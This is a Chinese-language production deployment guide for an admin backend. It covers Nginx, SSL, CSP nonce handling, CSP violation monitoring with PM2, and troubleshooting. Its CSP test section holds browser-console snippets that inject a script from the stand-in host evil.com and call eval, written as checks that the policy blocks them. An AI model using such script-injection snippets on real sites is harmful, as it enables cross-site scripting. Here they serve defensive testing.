# 生产环境部署指南

本指南详细说明如何在生产环境中部署本后台系统，包括配置编辑、安全配置、CSP 监控和性能优化。

## 目录
- [前置准备](#前置准备)
- [配置应用](#配置应用)
- [编译构建](#编译构建)
- [Nginx 配置](#nginx-配置)
- [CSP 监控部署](#csp-监控部署)
- [验证测试](#验证测试)
- [故障排查](#故障排查)

---

## 前置准备

### 1. 服务器要求

- **操作系统**：Ubuntu 20.04+ / CentOS 8+ / Debian 11+
- **Nginx**：1.18+ (支持 HTTP/2)
- **Node.js**：16+ (用于构建和 CSP 监控，可选)
- **SSL 证书**：Let's Encrypt 或商业证书

### 2. 安装依赖

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install nginx certbot python3-certbot-nginx

# CentOS/RHEL
sudo yum install nginx certbot python3-certbot-nginx

# 安装 Node.js (用于构建)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
```

### 3. 获取 SSL 证书

```bash
# 使用 Certbot 自动获取（替换为您的域名）
sudo certbot --nginx -d www.example.com

# 或手动配置（如果已有证书）
sudo mkdir -p /etc/nginx/ssl
sudo cp your-cert.crt /etc/nginx/ssl/certificate.crt
sudo cp your-key.key /etc/nginx/ssl/private.key
sudo chmod 600 /etc/nginx/ssl/private.key
```

---

## 配置应用

⚠️ **重要：在构建前必须完成此步骤！**

### 1. 编辑配置文件

编辑 `config/app.config.js`（或生产环境下的 `config/app.config.prod.js`）设置您的应用信息：

```bash
# 编辑配置文件
vi config/app.config.js
```

### 2. 必须修改的配置项

```json
{
  "app": {
    "name": "您的应用名称",           // 修改为您的品牌
    "title": "您的应用管理后台",      // 修改为您的标题
    "subtitle": "管理系统",           // 修改副标题
    "description": "您的应用描述"     // 修改描述
  },
  "api": {
    "baseUrl": "https://api.yourdomain.com",  // ⭐ 修改为您的 API 服务器
    "cspReportUrl": "/api/csp-report",
    "wsUrl": "wss://api.yourdomain.com/ws",    // ⭐ WebSocket 服务器地址（可选）
    "uploadUrl": "https://api.yourdomain.com/upload",   // ⭐ 文件上传地址（可选）
    "downloadUrl": "https://api.yourdomain.com/download" // ⭐ 文件下载地址（可选）
  },
  "upload": {
    "maxFileSize": 10485760,                  // 最大文件大小（10MB）
    "allowedTypes": [                         // 允许的文件类型
      "image/jpeg",
      "image/png",
      "application/pdf"
    ],
    "allowedExtensions": [".jpg", ".png", ".pdf"],
    "imageMaxWidth": 4096,
    "imageMaxHeight": 4096,
    "chunkSize": 1048576,                     // 分片大小（1MB）
    "enableChunkUpload": true                 // 启用分片上传
  },
  "external": {
    "ipGeoProvider": "https://ipapi.co",      // 可选：修改 IP 服务
    "ipApiProvider": "https://api.ipify.org"
  },
  "security": {
    "connectSrc": [                           // ⭐ 添加您信任的域名
      "https://api.yourdomain.com",
      "wss://api.yourdomain.com",             // WebSocket 需要添加 wss:// 协议
      "https://ipapi.co",
      "https://api.ipify.org"
    ],
    "preconnectHosts": [
      "https://api.yourdomain.com"
    ]
  }
}
```

### 3. 配置验证

```bash
# 验证 JSON 格式是否正确
node -e "console.log(require('./config/app.config.js'))"
```

---

## 编译构建

### 1. 本地构建（推荐）

```bash
# 克隆仓库
git clone https://github.com/your-org/your-backend.git
cd your-backend

# 安装依赖
npm install

# ⭐ 编辑配置文件（必须在构建前完成）
vi config/app.config.prod.js

# 构建生产版本（配置会自动注入）
npm run build

# 检查输出
ls -la dist/
```

**构建产物**：
- `dist/pages/` - 编译后的 HTML 页面（已注入配置的 CSP、预连接等）
- `dist/css/` - 样式文件
- `dist/utils/` - JavaScript 工具库
- `dist/images/` - 图片资源
- `dist/locales/` - 语言包
- `dist/config/` - 配置文件（会被复制到 dist）

### 2. 验证构建产物

```bash
# 检查配置是否正确注入
grep -r "api.example.com" dist/   # 不应该有默认域名
grep -r "{{APP_" dist/            # 不应该有未替换的占位符

# 检查 CSP 头是否包含您的域名
grep "Content-Security-Policy" dist/pages/login/login.html
```

### 3. 上传到服务器

```bash
# 使用 SCP（替换为您的服务器地址）
scp -r dist/* user@www.yourdomain.com:/var/www/app/dist/

# 或使用 rsync（推荐）
rsync -avz --delete dist/ user@www.yourdomain.com:/var/www/app/dist/

# 设置权限
ssh user@www.yourdomain.com "sudo chown -R www-data:www-data /var/www/app/dist"
ssh user@www.yourdomain.com "sudo chmod -R 755 /var/www/app/dist"
```

### 3. 自动化部署（可选）

创建 GitHub Actions 工作流：

```yaml
# .github/workflows/deploy.yml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Build
        run: npm run build:dist
      
      - name: Deploy to Server
        uses: appleboy/scp-action@master
        with:
          host: ${{ secrets.SERVER_HOST }}
          username: ${{ secrets.SERVER_USER }}
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          source: "dist/*"
          target: "/var/www/ice/"
```

---

## Nginx 配置

### 1. 复制配置文件

```bash
# 本地项目中的 nginx.conf 已包含完整配置
scp nginx.conf user@ice-markets-app.com:/tmp/

# 登录服务器
ssh user@ice-markets-app.com

# 备份现有配置
sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/default.backup

# 复制新配置
sudo cp /tmp/nginx.conf /etc/nginx/sites-available/ice-backend

# 创建软链接
sudo ln -sf /etc/nginx/sites-available/ice-backend /etc/nginx/sites-enabled/
```

### 2. ⚠️ 更新 CSP Nonce（重要）

由于 nonce 在每次编译时生成，需要手动更新 Nginx 配置中的 nonce 值：

**方法 1：从编译后的 HTML 中提取**
```bash
# 在本地提取 nonce
NONCE=$(grep -oP "nonce-\K[^']+" dist/pages/login/login.html | head -1)
echo "Nonce: $NONCE"

# 手动更新 nginx.conf 中的 script-src/style-src
# 将 'nonce-YOUR_NONCE_HERE' 替换为实际值
```

**方法 2：使用静态 CSP（简化）**
```nginx
# 如果不想每次更新 nonce，可以临时使用宽松策略
# 注意：这会降低安全性
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self';
    style-src 'self';
    # ... 其他配置
" always;
```

**方法 3：动态 Nonce（最佳实践）**
参考 `docs/SECURITY.md` 中的 Nginx + Lua 方案。

### 3. 测试配置

```bash
# 测试 Nginx 配置语法
sudo nginx -t

# 如果通过，重新加载
sudo systemctl reload nginx

# 查看状态
sudo systemctl status nginx
```

### 4. 创建日志目录

```bash
# 创建 CSP 违规日志目录
sudo mkdir -p /var/log/nginx
sudo touch /var/log/nginx/csp-violations.log
sudo chown www-data:www-data /var/log/nginx/csp-violations.log
```

---

## CSP 监控部署

### 方式 1：使用 Nginx 日志（推荐新手）

已在 `nginx.conf` 中配置，无需额外操作。

**查看日志**：
```bash
# 实时监控
sudo tail -f /var/log/nginx/csp-violations.log

# 统计违规
cat /var/log/nginx/csp-violations.log | grep -o 'POST /api/csp-report' | wc -l
```

### 方式 2：使用 Node.js 服务（推荐生产）

**部署步骤**：

```bash
# 1. 上传 CSP 监控脚本
scp utils/csp-report-handler.js user@ice-markets-app.com:/var/www/ice/utils/

# 2. 登录服务器
ssh user@ice-markets-app.com

# 3. 创建日志目录
mkdir -p /var/www/ice/logs

# 4. 安装 PM2（进程管理器）
sudo npm install -g pm2

# 5. 启动 CSP 监控服务
cd /var/www/ice
pm2 start utils/csp-report-handler.js --name csp-monitor

# 6. 设置开机自启
pm2 startup
pm2 save

# 7. 查看状态
pm2 status
pm2 logs csp-monitor
```

**更新 Nginx 配置**：
```nginx
# 将 CSP 报告转发到 Node.js 服务
location /api/csp-report {
    proxy_pass http://localhost:3001/csp-report;
    proxy_set_header Content-Type application/json;
    proxy_set_header X-Real-IP $remote_addr;
}
```

**重启服务**：
```bash
sudo systemctl reload nginx
pm2 restart csp-monitor
```

---

## 验证测试

### 1. SSL/HTTPS 测试

```bash
# 检查证书
curl -I https://www.ice-markets-app.com

# SSL Labs 评分（推荐 A+）
# 访问: https://www.ssllabs.com/ssltest/
```

### 2. 安全头测试

```bash
# 检查安全头
curl -I https://www.ice-markets-app.com | grep -E "(X-|Content-Security|Strict-Transport)"

# 预期输出:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Content-Security-Policy: default-src 'self'; ...
# Strict-Transport-Security: max-age=31536000
```

### 3. CSP 测试

**方法 1：浏览器开发者工具**
```javascript
// 在控制台执行（应被 CSP 阻止）
eval('alert("XSS Test")');  // ❌ 应报错

// 插入外部脚本（应被阻止）
var script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.head.appendChild(script);  // ❌ 应被阻止
```

**方法 2：SecurityHeaders.com**
访问: https://securityheaders.com/?q=https://www.ice-markets-app.com

**预期评分**: A 或 A+

### 4. CSP 报告测试

```bash
# 触发一个违规（在浏览器控制台）
var s = document.createElement('script');
s.innerHTML = 'console.log("test")';
document.body.appendChild(s);

# 检查是否收到报告
sudo tail -f /var/log/nginx/csp-violations.log
# 或
pm2 logs csp-monitor
```

### 5. 性能测试

```bash
# Lighthouse 测试
npx lighthouse https://www.ice-markets-app.com --view

# 预期指标:
# - Performance: 90+
# - Best Practices: 100
# - SEO: 90+
```

---

## 故障排查

### 问题 1: 页面样式/脚本不加载

**原因**: CSP 阻止了内联脚本/样式

**解决**:
```bash
# 1. 检查 nonce 是否一致
# HTML 中的 nonce:
grep 'nonce=' dist/pages/login/login.html | head -1

# Nginx CSP 中的 nonce:
grep 'Content-Security-Policy' /etc/nginx/sites-available/ice-backend

# 2. 确保两者一致
# 如果不一致，重新编译或更新 Nginx 配置
```

### 问题 2: CSP 报告未收到

**检查**:
```bash
# 1. 确认端点可访问
curl -X POST https://www.ice-markets-app.com/api/csp-report \
  -H "Content-Type: application/json" \
  -d '{"csp-report":{"blocked-uri":"test"}}'

# 2. 检查 Nginx 日志
sudo tail /var/log/nginx/error.log

# 3. 检查 PM2 状态（如果使用）
pm2 logs csp-monitor --lines 100
```

### 问题 3: CORS 错误

**解决**:
```nginx
# 在 nginx.conf 的 API 代理中添加
location /api/ {
    # ...existing config...
    
    # CORS 头
    add_header Access-Control-Allow-Origin "https://www.ice-markets-app.com" always;
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS" always;
    add_header Access-Control-Allow-Headers "Content-Type, x-user-account, x-crypto-mode, x-timestamp" always;
}
```

### 问题 4: 静态资源 404

**检查**:
```bash
# 1. 确认文件存在
ls -la /var/www/ice/dist/css/element.css

# 2. 检查权限
sudo chown -R www-data:www-data /var/www/ice/dist
sudo chmod -R 755 /var/www/ice/dist

# 3. 检查 Nginx 配置路径
grep 'root' /etc/nginx/sites-available/ice-backend
```

---

## 维护建议

### 日常检查（每日）

```bash
# 1. 检查服务状态
sudo systemctl status nginx
pm2 status

# 2. 查看 CSP 违规
sudo tail -100 /var/log/nginx/csp-violations.log

# 3. 检查错误日志
sudo tail -100 /var/log/nginx/error.log
```

### 定期审计（每周）

```bash
# 1. 更新系统和 Nginx
sudo apt update && sudo apt upgrade nginx

# 2. 续签 SSL 证书（Let's Encrypt 自动）
sudo certbot renew --dry-run

# 3. 生成 CSP 报告
cat /var/log/nginx/csp-violations.log | \
  grep -o 'violated-directive":"[^"]*' | \
  sort | uniq -c > weekly-csp-report.txt
```

### 备份策略

```bash
# 1. 备份配置
sudo tar -czf nginx-config-$(date +%Y%m%d).tar.gz /etc/nginx/

# 2. 备份代码
tar -czf ice-backend-$(date +%Y%m%d).tar.gz /var/www/ice/

# 3. 备份日志（压缩旧日志）
sudo gzip /var/log/nginx/csp-violations.log.1
```

---

## 安全检查清单

部署完成后，确认以下各项：

- [ ] HTTPS 强制启用（HTTP 重定向）
- [ ] SSL 证书有效且自动续签
- [ ] HSTS 头已启用
- [ ] CSP 配置正确（nonce 一致）
- [ ] 所有安全头已添加（X-Frame-Options, X-Content-Type-Options 等）
- [ ] CSP 违规报告正常工作
- [ ] 防火墙已配置（仅开放 80/443 端口）
- [ ] SSH 密钥登录（禁用密码登录）
- [ ] 定期备份已设置
- [ ] 日志轮转已配置
- [ ] 监控告警已配置（可选）

---

## 联系支持

- **技术文档**: `docs/SECURITY.md`
- **安全问题**: security@ice-markets.com
- **部署支持**: devops@ice-markets.com

---

**最后更新**: 2025-11-02  
**版本**: 1.1.0
